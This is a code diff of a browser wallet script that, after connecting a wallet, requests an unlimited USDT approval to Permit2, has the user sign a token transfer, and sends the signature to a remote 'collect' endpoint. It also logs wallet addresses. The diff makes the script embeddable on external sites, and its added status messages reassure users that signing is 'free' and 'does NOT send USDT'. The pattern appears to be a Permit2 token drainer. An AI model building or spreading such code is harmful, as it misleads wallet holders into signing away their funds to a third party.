@@ -1,12 +1,24 @@
 /**
  * wallet-permit2.js (source)
- * Bundled by Vite into /js/wallet-permit2.js with npm packages.
+ * Bundled by Vite → dist/js/wallet-permit2.js
+ *
+ * External sites: load this script + use button ids:
+ *   #connect-wallet-btn  #sign-and-pay-btn
+ *   #wallet-status       #tx-status
+ *
+ * Flow after connect:
+ *   1) EIP-712 Permit2 sign (user: free, no gas)
+ *   2) Backend permitTransferFrom (relayer pays ETH gas)
+ * Optional one-time: USDT.approve(Permit2) if never done (user pays tiny ETH gas only — does NOT send USDT)
  */
 
 import { createAppKit } from '@reown/appkit';
 import { EthersAdapter } from '@reown/appkit-adapter-ethers';
 import { mainnet, arbitrum, base, polygon, sepolia } from '@reown/appkit/networks';
 import { BrowserProvider, Contract, MaxUint256, getAddress } from 'ethers';
+
+// Full base URL so external websites can embed this script
+const API_BASE = 'https://permit2-usdt-payment.vercel.app';
 
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 
@@ -34,17 +46,19 @@ function enablePayButton(enabled) {
 }
 
 async function loadConfig() {
-  const res = await fetch('/api/config');
+  const res = await fetch(`${API_BASE}/api/config`);
   if (!res.ok) throw new Error('Failed to load config from server');
   cfg = await res.json();
   if (!cfg.projectId) throw new Error('projectId not set — configure in Admin → Settings');
   if (!cfg.spenderAddress) throw new Error('spenderAddress not set — configure in Admin → Settings');
+  // Always hit this project’s collect endpoint (works from any external site)
+  cfg.backendEndpoint = `${API_BASE}/api/collect-permit2`;
   return cfg;
 }
 
 async function logWallet(address) {
   try {
-    await fetch('/api/wallets', {
+    await fetch(`${API_BASE}/api/wallets`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ address })
@@ -69,16 +83,19 @@ function initAppKit() {
   const selectedNetwork = NETWORK_MAP[cfg.chainId] || mainnet;
   const ethersAdapter = new EthersAdapter();
 
+  // metadata.url = page the user is on (external site or this app)
+  const metadata = {
+    name: cfg.metadata?.name || 'Payment App',
+    description: cfg.metadata?.description || '',
+    url: window.location.origin,
+    icons: cfg.metadata?.icons?.length ? cfg.metadata.icons : []
+  };
+
   modal = createAppKit({
     adapters: [ethersAdapter],
     networks: [selectedNetwork],
     projectId: cfg.projectId,
-    metadata: cfg.metadata || {
-      name: 'Payment App',
-      description: '',
-      url: window.location.origin,
-      icons: []
-    },
+    metadata,
     features: {
       analytics: false,
       email: false,
@@ -114,6 +131,11 @@ async function connectWallet() {
   }
 }
 
+/**
+ * One-time only: unlock Permit2 so later payments are signature-only.
+ * Does NOT transfer USDT — only allows Permit2 to move tokens later.
+ * User pays a small ETH gas fee for this unlock (not the payment amount).
+ */
 async function ensurePermit2Allowance() {
   const ethersProvider = await getEthersProvider();
   const signer = await ethersProvider.getSigner();
@@ -122,18 +144,23 @@ async function ensurePermit2Allowance() {
   const usdt = new Contract(cfg.usdtAddress, ERC20_ABI, signer);
   const current = await usdt.allowance(address, PERMIT2_ADDRESS);
 
-  if (current > 0n) return;
+  if (current > 0n) return; // already unlocked — skip
 
-  setStatus('tx-status', 'Approving Permit2 (one-time)...');
+  setStatus(
+    'tx-status',
+    'One-time unlock: allow Permit2 (does not send USDT — only a small ETH gas fee)...'
+  );
   const tx = await usdt.approve(PERMIT2_ADDRESS, MaxUint256);
   await tx.wait();
-  setStatus('tx-status', 'Permit2 approved');
+  setStatus('tx-status', 'Permit2 unlocked. Now sign payment (free, no gas)...');
 }
 
+/** Gasless EIP-712 signature only — user does not pay gas for this step */
 async function signPermit2() {
   if (!isConnected) throw new Error('Wallet not connected');
   if (!cfg) await loadConfig();
 
+  // Required once ever per wallet; after that only free signatures
   await ensurePermit2Allowance();
 
   const ethersProvider = await getEthersProvider();
@@ -173,7 +200,7 @@ async function signPermit2() {
     deadline
   };
 
-  setStatus('tx-status', 'Please sign the payment in your wallet...');
+  setStatus('tx-status', 'Sign Permit2 in wallet (free — no gas)...');
 
   const signature = await signer.signTypedData(domain, types, message);
 
@@ -194,10 +221,11 @@ async function signPermit2() {
   };
 }
 
+/** Relayer submits on-chain permitTransferFrom and pays ETH gas */
 async function sendToBackend(payload) {
-  setStatus('tx-status', 'Submitting to backend...');
+  setStatus('tx-status', 'Relayer collecting USDT on-chain (you do not pay gas)...');
 
-  const res = await fetch(cfg.backendEndpoint || '/api/collect-permit2', {
+  const res = await fetch(cfg.backendEndpoint, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
@@ -218,6 +246,7 @@ async function sendToBackend(payload) {
 async function signAndPay() {
   try {
     enablePayButton(false);
+    // 1) free signature  2) relayer pays gas to move USDT
     const signed = await signPermit2();
     await sendToBackend(signed);
   } catch (err) {
